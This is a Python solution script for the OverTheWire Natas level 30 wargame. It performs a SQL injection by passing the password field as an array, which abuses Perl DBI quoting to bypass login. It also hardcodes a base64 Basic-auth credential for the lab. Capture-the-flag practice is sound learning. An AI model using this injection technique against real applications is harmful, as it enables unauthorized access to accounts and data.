import requests

# Base URL
url = 'http://natas30.natas.labs.overthewire.org/index.pl'

# Function to make POST request
def send_request():

    # Our parameters
    params = dict(username="natas31", password=['"any" or 1', 4])
    
    headers = {
        'Authorization': 'Basic bmF0YXMzMDpHejRhdDhDZE9ZUWtrSjhmSmFtYzExSmc1aE9uWE05WA==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas30.natas.labs.overthewire.org',
        'Referer': 'http://natas30.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }

    # Make the POST request
    response = requests.post(url, headers=headers, data=params)

    return response.text

response = send_request()
print(response)